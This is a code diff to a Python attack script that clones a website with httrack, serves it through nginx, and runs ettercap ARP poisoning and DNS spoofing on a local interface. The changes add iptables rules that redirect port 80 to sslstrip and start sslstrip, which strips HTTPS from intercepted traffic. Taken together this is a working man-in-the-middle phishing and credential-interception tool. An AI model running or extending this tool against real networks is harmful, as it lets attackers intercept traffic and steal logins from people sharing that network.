@@ -6,7 +6,7 @@ import socket
 import fcntl
 import struct
 
-EXECUTABLES = ['nginx', 'ettercap', 'locate']
+EXECUTABLES = ['nginx', 'ettercap', 'locate', 'httrack', 'sslstrip']
 
 def find_file(file_name):
     output = subprocess.Popen(['locate',file_name], stdout=subprocess.PIPE).communicate()[0]
@@ -42,7 +42,7 @@ def update_nginx_conf(conf_path):
     if fd_index != -1:
         fd_path = fd_data[fd_index+1].split()[1][:-1]
     default_path = fd_path
-    fd_path += sys.argv[1]
+    fd_path += sys.argv[1].rsplit('@',1)[-1]
     index = find_line(f_data)
     index += 1
     old_f_path = f_data[index].split()[1][:-1]
@@ -75,8 +75,11 @@ def call_httrack(default_path):
     except KeyboardInterrupt:
         pass
     subprocess.call(["service","nginx","restart"])
+    subprocess.call(["iptables","--flush","-t","nat"])
+    subprocess.call(["iptables","-t","nat","-A","PREROUTING","-p","tcp","--destination-port", \
+        "80","-j","REDIRECT","--to-port","6666"])
+    subprocess.Popen(["sslstrip","-l","6666"])
     subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","//","//","-i",sys.argv[2]])
-
 
 def check_executables():
     for e in EXECUTABLES:
